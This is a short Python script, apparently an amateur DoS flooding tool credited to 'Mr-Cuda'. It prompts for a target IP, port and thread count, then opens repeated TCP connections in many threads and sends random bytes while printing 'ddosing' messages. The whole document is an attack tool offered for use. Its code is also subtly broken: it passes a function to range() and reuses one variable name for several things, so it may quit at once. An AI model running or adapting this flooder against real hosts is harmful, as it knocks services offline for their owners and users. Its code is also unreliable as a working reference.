from concurrent.futures import thread
import random
import socket
from struct import pack
import threading
import os 
import time
print("""
 ▓█████▄  ▒█████    ██████ ▓█████ ██▀███  
 ▒██▀ ██▌▒██▒  ██▒▒██    ▒ ▓█   ▀▓██ ▒ ██▒
 ░██   █▌▒██░  ██▒░ ▓██▄   ▒███  ▓██ ░▄█ ▒
▒░▓█▄   ▌▒██   ██░  ▒   ██▒▒▓█  ▄▒██▀▀█▄  
░░▒████▓ ░ ████▓▒░▒██████▒▒░▒████░██▓ ▒██▒
░ ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░░░ ▒░ ░ ▒▓ ░▒▓░
  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░   ░ ░    ░▒ ░ ▒░
  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░     ░     ░   ░ 
    ░        ░ ░        ░     ░     ░     
Made by Mr-Cuda
""")
a = str(input("ip>"))
b = int(input("port>"))
c = int(input("thread>"))
#target = '10.0.0.138'
target = (a)
port = (b)
thread = (c)
def start():
    s = random._urandom(10)
    x = int(0)
    while True:
        try:
            d =socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            d.connect((target,port))
            d.send(s)
            for i in range(pack):
                d.send(s)
            x += 1
            print(f"ddosing {target} on port {port} allready sent : {x}")
        except:
            d.close()
            print("we are done here...")
            quit()
            time.sleep(10)
for x in range(thread):
    thread = threading.Thread(target=start)
    thread.start()
